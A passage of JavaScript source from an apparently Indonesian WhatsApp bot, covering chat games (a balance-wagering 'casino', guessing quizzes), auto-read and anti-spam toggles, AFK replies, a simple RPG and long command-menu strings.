} else m.reply(`*PILIH ANGKA*\n\n${brd.slice(0, 3).join("")}\n${brd.slice(3, 6).join("")}\n${brd.slice(6).join("")}\n\nTerpilih: ${petakbom[m.sender].pick}\nSisa Nyawa: ${petakbom[m.sender].nyawa}\nBom: ${petakbom[m.sender].bomb}`)
}}

if (fs.existsSync(`./data/${m.chat}.json`)) {
var casinoo = setCasino(`${m.chat}`)
if (m.sender == `${casinoo.Y}` && body.toLowerCase() == 'n') {
Line.sendMessage(m.chat, { text: `*GAME DIBATALKAN*\n\n• @${casinoo.Y.split("@")[0]} Membatalkan game`, mentions: [casinoo.Y] }, {quoted: m })
deleteCasino(m.chat)
}
if (m.sender == `${casinoo.Y}` && body.toLowerCase() == 'y') {
var angka1 = await randomNomor(10, 20)
var angka2 = await randomNomor(10, 20)
if (angka1 > angka2) {
starGame = `*🎰 GAME CASINO 💰*

• @${casinoo.Z} --> ${angka1} 👑
• @${casinoo.Y.split('@')[0]} --> ${angka2} 🥈

Pemenang: [ @${casinoo.Z} ]
Mendapatkan: Rp ${nebal(casinoo.nominal)}`
Line.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, {quoted: m })
await addSaldo(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal))
await minSaldo(`${casinoo.Y}`, nebal(casinoo.nominal))
deleteCasino(m.chat)
} else if (angka1 < angka2) {
starGame = `*🎰 GAME CASINO 💰*

• @${casinoo.Z} --> ${angka1} 🥈
• @${casinoo.Y.split('@')[0]} --> ${angka2} 👑

Pemenang: [ @${casinoo.Y.split('@')[0]} ]
Mendapatkan: Rp ${nebal(casinoo.nominal)}`
Line.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y] }, {quoted: m })
await addSaldo(`${casinoo.Y}`, nebal(casinoo.nominal))
await minSaldo(`${casinoo.Z}@s.whatsapp.net`, nebal(casinoo.nominal))
deleteCasino(m.chat)
} else if (angka1 = angka2) {
starGame = `*🎰 GAME CASINO 💰*

• @${casinoo.Z} --> ${angka1} 📍
• @${casinoo.Y.split('@')[0]} --> ${angka2} 📍

Hasil draw, tidak ada pemenang!`
Line.sendMessage(m.chat, { text: starGame, mentions: [casinoo.Z + "@s.whatsapp.net", casinoo.Y]}, { quoted: m })
deleteCasino(m.chat)
}}
}

if ((from in tebakgambar)) {
let { soal, jawaban, hadiah, waktu } = tebakgambar[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6)
Line.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebakgambar[m.chat];
} else if (!m.fromMe && m.text.includes('.nyerah')) {
Line.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebakgambar[m.chat];
} else if (!m.fromMe) {
Line.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in tebakkalimat)) {
let { soal, jawaban, hadiah, waktu } = tebakkalimat[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6)
Line.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebakkalimat[m.chat];
} else if (!m.fromMe && m.text.includes('.nyerah')) {
Line.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebakkalimat[m.chat];
} else if (!m.fromMe) {
Line.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in tebakkata)) {
let { soal, jawaban, hadiah, waktu } = tebakkata[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6)
Line.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebakkata[m.chat];
} else if (!m.fromMe && m.text.includes('.nyerah')) {
Line.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebakkata[m.chat];
} else if (!m.fromMe) {
Line.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in tebaklirik)) {
let { soal, jawaban, hadiah, waktu } = tebaklirik[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6)
Line.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebaklirik[m.chat];
} else if (!m.fromMe && m.text.includes('.nyerah')) {
Line.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebaklirik[m.chat];
} else if (!m.fromMe) {
Line.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in tebakanime)) {
let { soal, jawaban, hadiah, waktu } = tebakanime[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6)
Line.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebakanime[m.chat];
} else if (!m.fromMe && m.text.includes('.nyerah')) {
Line.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebakanime[m.chat];
} else if (!m.fromMe) {
Line.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in tebaklagu)) {
let { soal, jawaban, hadiah, waktu } = tebaklagu[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6)
Line.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebaklagu[m.chat];
} else if (!m.fromMe && m.text.includes('.nyerah')) {
Line.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebaklagu[m.chat];
} else if (!m.fromMe) {
Line.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in kuis)) {
let { soal, jawaban, hadiah, waktu } = kuis[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6)
Line.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete kuis[m.chat];
} else if (!m.fromMe && m.text.includes('.nyerah')) {
Line.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete kuis[m.chat];
} else if (!m.fromMe) {
Line.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in siapakahaku)) {
let { soal, jawaban, hadiah, waktu } = siapakahaku[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6)
Line.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete siapakahaku[m.chat];
} else if (!m.fromMe && m.text.includes('.nyerah')) {
Line.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete siapakahaku[m.chat];
} else if (!m.fromMe) {
Line.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in tebakkimia)) {
let { soal, jawaban, hadiah, waktu } = tebakkimia[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6)
Line.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebakkimia[m.chat];
} else if (!m.fromMe && m.text.includes('.nyerah')) {
Line.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebakkimia[m.chat];
} else if (!m.fromMe) {
Line.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in tebakbendera)) {
let { soal, jawaban, hadiah, waktu } = tebakbendera[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6)
Line.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete tebakbendera[m.chat];
} else if (!m.fromMe && m.text.includes('.nyerah')) {
Line.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete tebakbendera[m.chat];
} else if (!m.fromMe) {
Line.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in asahotak)) {
let { soal, jawaban, hadiah, waktu } = asahotak[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6)
Line.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete asahotak[m.chat];
} else if (!m.fromMe && m.text.includes('.nyerah')) {
Line.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete asahotak[m.chat];
} else if (!m.fromMe) {
Line.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in susunkata)) {
let { soal, jawaban, hadiah, waktu } = susunkata[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6)
Line.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete susunkata[m.chat];
} else if (!m.fromMe && m.text.includes('.nyerah')) {
Line.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete susunkata[m.chat];
} else if (!m.fromMe) {
Line.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in caklontong)) {
let { soal, jawaban, hadiah, waktu } = caklontong[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6)
Line.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete caklontong[m.chat];
} else if (!m.fromMe && m.text.includes('.nyerah')) {
Line.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete caklontong[m.chat];
} else if (!m.fromMe) {
Line.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

if ((from in kuismath)) {
let { soal, jawaban, hadiah, waktu } = kuismath[m.chat]
if (body.toLowerCase().includes(jawaban) && !m.fromMe) {
await m.reply(`*JAWABAN BENAR*\nJawaban: ${jawaban}\nHadiah: 6 limit`);
addLimit(usere, 6)
Line.sendMessage(m.chat, {react: {text: '🔵', key: m.key}})
clearTimeout(waktu);
delete kuismath[m.chat];
} else if (!m.fromMe && m.text.includes('.nyerah')) {
Line.sendMessage(m.chat, {react: {text: '🙂', key: m.key,}})
await Line.sendMessage(m.chat, {text: `*KAMU MENYERAH*\nSoal: ${soal}\nJawaban: ${jawaban}`}, {quoted: m})
clearTimeout(waktu);
delete kuismath[m.chat];
} else if (!m.fromMe) {
Line.sendMessage(m.chat, {react: {text: '🔴', key: m.key,}})}
}

const JwbTrue = (tebak, hadiah) => {
return`*🎮 ${tebak} 🎮*\n\nJawaban Benar! 🎉\n+ ${hadiah} Limit`
}
const waktuHabis = (jawaban) => {
return `*WAKTU HABIS!*\nJawaban: ${jawaban}`
}

if (tebakgame[m.chat] && !m.fromMe) {
let json = JSON.parse(JSON.stringify(tebakgame[m.chat][1]))
jawaban = json.jawaban.toLowerCase().trim()
if (body.toLowerCase() == jawaban && !m.fromMe) {
await addLimit(m.sender, tebakgame[m.chat][2]) 
await m.reply(JwbTrue("TEBAK GAME", tebakgame[m.chat][2]) + `\n\nKetik .tebakgame untuk bermain lagi...`)
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
} else if (body.toLowerCase().includes('.nyerah', '. nyerah')) {
m.reply('Yahh, masa nyerah :)')
clearTimeout(tebakgame[m.chat][3])
delete tebakgame[m.chat]
} else if (!m.fromMe) {
Line.sendMessage(m.chat, {react: { text: "🔴",key: m.key,}})
}}

if (command && global.autotyping) {
if (command) { Line.readMessages([m.key])}
Line.sendPresenceUpdate('composing', from)
}

if (command && global.autoread) {
const readkey = { remoteJid: m.chat, id: m.key.id, participant: m.isGroup ? m.key.participant : undefined }
await Line.readMessages([readkey]); }

if (global.autobio) {
const status = `${botname} Online`;
Line.updateProfileStatus(status).catch(_ => _);
}

if (command && !m.key.fromMe && global.antispam) {
if (antispam.isFiltered(m.sender)) return m.reply('*( Anti Spam )* Tolong berikan jeda 5 detik.')
antispam.addFilter(m.sender)
}

const jir = ['😀', '😃', '😄', '😁','😆','😅','😂','🤣', '😉', '😑', '😐']
const emji = jir[Math.floor(Math.random() * jir.length)]

const onlyOwn = () => {
m.reply(mess.owner)
}
const onlyPrem = () => {
m.reply(mess.prem)
}
const onlyGrup = () => {
m.reply(mess.grup)
}
const onlyPrivat = () => {
m.reply(mess.privat)
}
const onlyAdmin = () => {
m.reply(mess.admin)
}
const onlyBotAdmin = () => {
m.reply(mess.botadmin)
}

const onlyOp = () => {
m.reply(mess.op)
}
const onlyOr = () => {
m.reply(mess.or)
}
const onlyOb = () => {
m.reply(mess.ob)
}
const onlyOa = () => {
m.reply(mess.oa)
}

if (m.isGroup && !m.key.fromMe) {
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let ment of mentionUser) {
if (afk.checkAfkUser(ment, _afk)) {
let getId2 = afk.getAfkId(ment, _afk)
let getReason2 = afk.getAfkReason(getId2, _afk)
let getTimee = Date.now() - afk.getAfkTime(getId2, _afk)
let heheh2 = ms(getTimee)
m.reply(`Jangan tag dia! dia sedang AFK\n\nAlasan: ${getReason2}\nSejak: ${heheh2.hours} jam, ${heheh2.minutes} menit, ${heheh2.seconds} detik yang lalu\n`)
}}

if (afk.checkAfkUser(m.sender, _afk)) {
let getId = afk.getAfkId(m.sender, _afk)
let getReason = afk.getAfkReason(getId, _afk)
let getTime = Date.now() - afk.getAfkTime(getId, _afk)
let heheh = ms(getTime)
_afk.splice(afk.getAfkPosition(m.sender, _afk), 1)
fs.writeFileSync('./data/afk.json', JSON.stringify(_afk))
Line.sendTextWithMentions(m.chat, `@${m.sender.split('@')[0]} telah kembali dari AFK\n\nAlasan: ${getReason}\nSelama: ${heheh.hours} jam, ${heheh.minutes} menit, ${heheh.seconds} detik\n`, m)
}}

if (isCmd && !isOwner && !m.key.fromMe) {
if (db.data.users[m.sender].banned) return m.reply('Kamu telah dibanned!')
}
if (m.isGroup && db.data.chats[m.chat].mute) {
if (!isAdmins && !isOwner) return
}
if (global.gconly && !isGc && isCmd) {
if (!isOwner) return
}
if (global.pconly && !isPc && isCmd) {
if (!isOwner) return
}

let data = {}
try {
  data = JSON.parse(fs.readFileSync('./data/userRpg.json'))
  if (!data.players) data.players = []
} catch (e) {
  data = { players: [] }
}

const joinRPG = (sender, m) => {
  const isRegistered = data.players.some(player => player.sender === sender)
  if (isRegistered) return m.reply(`Kamu udah join RPG sebelumnya!`)

  const player = { 
    sender, 
    hp: 100, 
    kelaparan: 0, 
    kehausan: 0, 
    status: 'idle', 
    energi: 100,
    resources: { 
      kayu: 10, 
      iron: 5, 
      roti: 5, 
      air: 5, 
      uang: 0,
      umpan: 5
    },
    lastAdventure: 0
  }
  data.players.push(player)
  fs.writeFileSync('./data/userRpg.json', JSON.stringify(data, null, 2))
  m.reply(`Berhasil join ke RPG!`)
}

const randomItem = () => {
  const items = [
    { name: 'Kayu', chance: 30 },
    { name: 'Iron', chance: 20 },
    { name: 'Zamrud', chance: 3 },
    { name: 'Emas', chance: 3 },
    { name: 'Diamond', chance: 1 },
    { name: 'Batu', chance: 25 },
    { name: 'Redstone', chance: 15 },
    { name: 'Roti', chance: 20 },
    { name: 'Air', chance: 20 },
    { name: 'Sapi', chance: 10 },
    { name: 'Domba', chance: 10 },
    { name: 'Umpan', chance: 18 },
    { name: 'Uang', chance: 1 },
    { name: 'Kelinci', chance: 8 }
  ]
  const item = items.find(i => randomNomor(1, 100) <= i.chance)
  return { item: item.name, amount: randomNomor(1, 5) }
}

const randomChance = () => {
  return randomNomor(1, 100) <= 70
}

const updateResources = (player, item, amount) => {
  if (item === 'Roti') {
    player.kelaparan = Math.max(0, player.kelaparan - 3)
    player.energi = Math.min(100, player.energi + 5)
  }
  if (item === 'Air') {
    player.kehausan = Math.max(0, player.kehausan - 3)
    player.energi = Math.min(100, player.energi + 3)
  }
  player.resources[item.toLowerCase()] += amount
}

const regenerateEnergy = () => {
  const interval = 3 * 60 * 1000
  setInterval(() => {
    for (const player of data.players) {
      player.energi = Math.min(100, player.energi + 5)
    }
    fs.writeFileSync('./data/userRpg.json', JSON.stringify(data, null, 2))
  }, interval)
}
regenerateEnergy()

const ditt2 = async (from, m, delayTime, ...texts) => {
  let { key } = await Line.sendMessage(from, {text: '------'}, { quoted: m })
  for (let text of texts) {
    await sleep(delayTime)
    await Line.sendMessage(from, {text, edit: key}, { quoted: m })
  }
}

switch (command) {

// ==========================

case 'menu':
case 'menu-v': {
vreact();
let susu = `
┏━━━❖•ೋ° LINE-BOT 
┃ 
┃  🤖 *INFO BOT*  
┃  ───────────────  
┃  ✦ Bot Name : *${botname}*  
┃  ✦ Owner : *${ownername}*  
┃  ✦ Prefix : *Multi*  
┃  ✦ Version : *v${version}*  
┃  ✦ Platform : *C-Ubuntu*  
┃  
┣━━━❖•ೋ° COMMAND 
┃  
┃  01. *${prefix}mainmenu*        
┃  02. *${prefix}ownermenu*       
┃  03. *${prefix}groupmenu*       
┃  04. *${prefix}gamesmenu*       
┃  05. *${prefix}storemenu*       
┃  06. *${prefix}menfesmenu*      
┃  07. *${prefix}cpanelmenu*      
┃  08. *${prefix}ngepushmenu*     
┃  09. *${prefix}donlodmenu*      
┃  10. *${prefix}chataimenu*      
┃  11. *${prefix}searchmenu*      
┃  12. *${prefix}pteromenu*       
┃  13. *${prefix}nsfwmenu*        
┃  14. *${prefix}ephotomenu*      
┃  15. *${prefix}cecanmenu*       
┃  16. *${prefix}coganmenu*       
┃  17. *${prefix}toolsmenu*       
┃  18. *${prefix}voicemenu*       
┃  19. *${prefix}islamicmenu*     
┃  20. *${prefix}saweriamenu*     
┃  21. *${prefix}orkutmenu*       
┃  22. *${prefix}animemenu*       
┃  23. *${prefix}funmenu*         
┃  24. *${prefix}othersmenu*      
┃  25. *${prefix}linodemenu*      
┃  26. *${prefix}digitalocean*    
┃  27. *${prefix}ppobindonesia*   
┃  
┗━━━❖•ೋ°──────────
✨ *Line v${version} Official Version*  
`;
const bet = {
title: "MENU",
sections: [
{
title: `List Menu Sering Digunakan`, 
highlight_label: `Populer`,
rows: [
{
title: "All Menu",
description: "📌 Menampilkan All Menu",
id: `${prefix}allmenu-v`, 
},
]},
{
title: `List Menu Yang Dipisahkan`, 
highlight_label: ``,
rows: [
{
title: "Main Menu",
description: "🎉 Menampilkan Main Menu",
id: `${prefix}mainmenu-v`, 
},
{
title: "Owner Menu",
description: "👤 Menampilkan Owner Menu",
id: `${prefix}ownermenu-v`, 
},
{
title: "Group Menu",
description: "👥 Menampilkan Group Menu",
id: `${prefix}groupmenu-v`, 
},
{
title: "Games Menu",
description: "🎮 Menampilkan Games Menu",
id: `${prefix}gamesmenu-v`, 
},
{
title: "Store Menu",
description: "🛍️ Menampilkan Store Menu",
id: `${prefix}storemenu-v`, 
},
{
title: "Menfes Menu",
description: "📮 Menampilkan Menfes Menu",
id: `${prefix}menfesmenu-v`, 
},
{
title: "Cpanel Menu",
description: "🛠️ Menampilkan Cpanel Menu",
id: `${prefix}cpanelmenu-v`, 
},
{
title: "Ngepush Menu",
description: "💾 Menampilkan Ngepush Menu",
id: `${prefix}ngepushmenu-v`, 
},
{
title: "PPOB Indonesia",
description: "💰 Menampilkan PPOB Indonesia",
id: `${prefix}ppobindonesia-v`, 
},
{
title: "Donlod Menu",
description: "📂 Menampilkan Donlod Menu",
id: `${prefix}donlodmenu-v`, 
},
{
title: "ChatAI Menu",
description: "🤖 Menampilkan ChatAI Menu",
id: `${prefix}chataimenu-v`, 
},
{
title: "Search Menu",
description: "🔎 Menampilkan Search Menu",
id: `${prefix}searchmenu-v`, 
},
{
title: "NSFW Menu",
description: "🔞 Menampilkan NFSW Menu",
id: `${prefix}nsfwmenu-v`, 
},
{
title: "Ephoto Menu",
description: "🖼️ Menampilkan Ephoto Menu",
id: `${prefix}ephotomenu-v`, 
},
{
title: "Cecan Menu",
description: "👰🏻 Menampilkan Cecan Menu",
id: `${prefix}cecanmenu-v`, 
},
{
title: "Tools Menu",
description: "🧰 Menampilkan Tools Menu",
id: `${prefix}toolsmenu-v`, 
},
{
title: "Voice Menu",
description: "🎧 Menampilkan Voice Menu",
id: `${prefix}voicemenu-v`, 
},
{
title: "Fun Menu",
description: "😹 Menampilkan Fun Menu",
id: `${prefix}funmenu`, 
},
{
title: "Islamic Menu",
description: "🕌 Menampilkan Islamic Menu",
id: `${prefix}islammenu-v`, 
},
{
title: "Maker Menu",
description: "🎨 Menampilkan Maker Menu",
id: `${prefix}makermenu`, 
},
{
title: "Linode Menu",
description: "💻 Menampilkan Linode Menu",
id: `${prefix}linodemenu-v`, 
},
{
title: "Digital Ocean",
description: "🖥️ Menampilkan Digital Ocean",
id: `${prefix}digitalocean-v`, 
},
{
title: "Anime Menu",
description: "😼 Menampilkan Anime Menu",
id: `${prefix}animemenu`, 
},
{
title: "Others Menu",
description: "📪 Menampilkan Others Menu",
id: `${prefix}othersmenu-v`, 
},
]},
{
title: `Dokumentasi asli dari script ini`, 
highlight_label: ``,
rows: [
{
title: "Script",
description: "💳 Beli script ini dengan harga murah",
id: `${prefix}script`, 
},
{
title: "Credit",
description: "👑 Orang yang membantu mengembangkan",
id: `${prefix}credit`, 
},
{
title: "Info Bot",
description: "📋 Informasi total fitur dan lainnya",
id: `${prefix}infobot`, 
},
]},
]};
if (tipemenu === 'v1') {
listbut2(m.chat, susu, bet, m)
} else if (tipemenu === 'v2') {
listbut(m.chat, susu, bet, m)
} else if (tipemenu === 'v3') {
vreply(susu)
}}
break

case 'allmenu':
case 'allmenu-v': {
vreact()
let dede = `
┏━━━━━━━━━━━━━━━━━━━┓
┃         🌟 ${monospace("INFO BOT")} 🌟         
┗━━━━━━━━━━━━━━━━━━━┛
  🔹 Nama: ${botname}
  🔹 Owner: ${ownername}
  🔹 Prefix: Multi Prefix
  🔹 Versi: v${version} Beta
  🔹 Platform: Chrome (Ubuntu)
  
━━━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━━━┓
┃       👤 ${monospace("INFO USER")} 👤       
┗━━━━━━━━━━━━━━━━━━━┛
  🔹 Nama: ${db.data.users[m.sender].nama}
  🔹 Profil: ${db.data.users[m.sender].daftar ? 'Sudah terdaftar' : 'Belum terdaftar'}
  🔹 Status: ${isOwner ? 'Owner' : isPremium ? 'Premium' : 'User'}
  🔹 Saldo: Rp. ${toRupiah(cekSaldo(m.sender))}
  🔹 Limit: ${cekLimit(m.sender)} Limit
  
━━━━━━━━━━━━━━━━━━━

┏━━━━━━━━━━━━━━━━━━━┓
┃      📜 ${monospace("MAIN MENU")} 📜      
┗━━━━━━━━━━━━━━━━━━━┛
 • 📝 ${prefix}regis 
 • ❌ ${prefix}unregis 
 • ✨ ${prefix}nickname 
 • 📜 ${prefix}setmenu 
 • 📜 ${prefix}setallmenu
 • 🔢 ${prefix}prefix 
 • 📋 ${prefix}infome 
 • 🤖 ${prefix}infobot 
 • 📺 ${prefix}channel -
 • 💻 ${prefix}script 
 • 🌟 ${prefix}credit 
 • 💵 ${prefix}qris
 • 🪙 ${prefix}gold 
 • 💰 ${prefix}saldo 
 • 🎟️ ${prefix}limit 
 • 📊 ${prefix}cekgold 
 • 💸 ${prefix}ceksaldo 
 • 📉 ${prefix}ceklimit 
 • 🔄 ${prefix}tfsaldo 
 • 👤 ${prefix}owner 
 • 📶 ${prefix}ping 
 • ⏱️ ${prefix}runtime
 • 💳 ${prefix}payment
 • 🛠️ ${prefix}totalfitur 
 • 📩 ${prefix}report 
 • 📲 ${prefix}reply
 • 📝 ${prefix}reports 
 • 🗑️ ${prefix}delreports 
 • 🧐 ${prefix}cekreports 
 • ❌ ${prefix}del 

┏━━━━━━━━━━━━━━━━━━━┓
┃      📜 ${monospace("OWNER MENU")} 📜      
┗━━━━━━━━━━━━━━━━━━━┛
 • 🆕 ${prefix}addcase
 • 🗑️ ${prefix}delcase
 • 📂 ${prefix}getcase
 • 🔍 ${prefix}cekcase
 • 📜 ${prefix}listcase
 • 🛠️ ${prefix}addfunc
 • ❌ ${prefix}delfunc
 • 📂 ${prefix}getfunc
 • 🔍 ${prefix}cekfunc
 • 🔤 ${prefix}addlet
 • ❌ ${prefix}dellet
 • 📂 ${prefix}getlet
 • 📦 ${prefix}addconst
 • 📌 ${prefix}getdep
 • 📁 ${prefix}gantifile
 • 📤 ${prefix}sendfitur
 • 🔄 ${prefix}backup
 • 💾 ${prefix}getsession
 • 🗑️ ${prefix}delsession
 • 📥 ${prefix}ambilsc
 • 📤 ${prefix}sendsc
 • 📨 ${prefix}addres
 • ❌ ${prefix}delres
 • 📜 ${prefix}listres
 • ⭐ ${prefix}addprem
 • ❌ ${prefix}delprem
 • 📜 ${prefix}listprem
 • ⭐ ${prefix}addowner
 • ❌ ${prefix}delowner
 • 📜 ${prefix}listowner
 • 🪙 ${prefix}addgold
 • 💸 ${prefix}mingold
 • 💰 ${prefix}addsaldo
 • 💸 ${prefix}minsaldo
 • 📈 ${prefix}addlimit
 • 📉 ${prefix}minlimit
 • 🗑️ ${prefix}sampah
 • 🗑️ ${prefix}delsampah
 • 🗑️ ${prefix}delsampah2
 • 💻 ${prefix}clearsesi
 • 📂 ${prefix}getdb
 • 📁 ${prefix}getfolder
 • 📂 ${prefix}getfile
 • 📄 ${prefix}getfile2
 • 🗂️ ${prefix}addfolder
 • 📄 ${prefix}addfile
 • 🗑️ ${prefix}delfolder
 • 🗑️ ${prefix}delfile
 • 📣 ${prefix}bcgc
 • 📸 ${prefix}bcimg
 • 🎥 ${prefix}bcvid
 • 🎮 ${prefix}bcsl
 • 🧑‍💻 ${prefix}adduserdb
 • 🧑‍💻 ${prefix}deluserdb
 • 🚫 ${prefix}block
 • ✅ ${prefix}unblock
 • 📜 ${prefix}listblock
 • 🌐 ${prefix}public
 • 🧑‍💻 ${prefix}self
 • 🔄 ${prefix}restart
 • 🧑‍💻 ${prefix}join
 • ✏️ ${prefix}setnamabot
 • 📝 ${prefix}setbiobot
 • 🖼️ ${prefix}setppbot
 • ❌ ${prefix}delppbot
 • ⌨️ ${prefix}autotyping
 • 📖 ${prefix}autoread
 • 📝 ${prefix}autobio
 • 🚫 ${prefix}anticall
 • 🛑 ${prefix}antispam
 • 🤖 ${prefix}antibot
 • 🚷 ${prefix}ban
 • 🚫 ${prefix}unban
 • 📜 ${prefix}listban
 • 🌐 ${prefix}creategc
 • ➕ ${prefix}addexc
 • ❌ ${prefix}delexc
 • 📜 ${prefix}listexc
 • 📖 ${prefix}read
 • 🖥️ ${prefix}gh

┏━━━━━━━━━━━━━━━━━━━┓
┃      📜 ${monospace("GROUP MENU")} 📜      
┗━━━━━━━━━━━━━━━━━━━┛
